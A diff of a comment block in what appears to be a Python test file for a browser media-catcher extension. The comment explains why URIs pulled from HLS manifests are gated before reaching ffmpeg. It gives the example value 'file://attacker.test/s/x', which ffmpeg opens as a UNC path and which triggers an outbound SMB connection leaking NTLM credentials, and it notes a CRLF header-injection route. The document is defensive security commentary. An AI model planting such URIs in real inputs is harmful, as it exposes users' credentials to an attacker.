@@ -673,13 +673,16 @@ def test_a_schema_refusal_cannot_carry_an_attempt_token():
 #
 # Every other URL this host takes arrived from webRequest or a gated content
 # script. record's did not: it is a URI lifted from the BODY of a fetched HLS
-# manifest, and media-catcher/lib/hls.js resolveUrl returns an absolute URI
-# unchanged, so the playlist decides the string. recordLiveHls skips its
-# findSiblingAudio probe when audioUrl is already set, which is exactly the
-# case an #EXT-X-MEDIA:TYPE=AUDIO line creates, so nothing upstream looks at
-# it. ffmpeg opens "file://attacker.test/s/x" as the UNC path
-# \attacker.test\s\x -- an outbound SMB connection carrying the user's NTLM
-# credentials -- which is the threat 2c3e0aa gated mirrors against.
+# manifest. The live route is background.js "record-live" -> resolveVideoUrl,
+# which fetches the master playlist and returns pickVariant(...).uri, and
+# media-catcher/lib/hls.js resolveUrl returns an absolute URI unchanged, so
+# the playlist decides the string. ffmpeg opens "file://attacker.test/s/x" as
+# the UNC path \\attacker.test\s\x -- an outbound SMB connection carrying the
+# user's NTLM credentials -- which is the threat 2c3e0aa gated mirrors
+# against. audioUrl is gated for the same reason rather than because a shipped
+# producer reaches it: findSiblingAudio only returns a same-stream-directory
+# or token-swapped sibling of a URL that already passed, so it is pinned by
+# construction rather than by test. The point is that the lane has a boundary.
 #
 # The headers are the same lane's second half: ffmpeg_cmd interpolates referer
 # and userAgent into one -headers value separated by a literal \r\n, so a
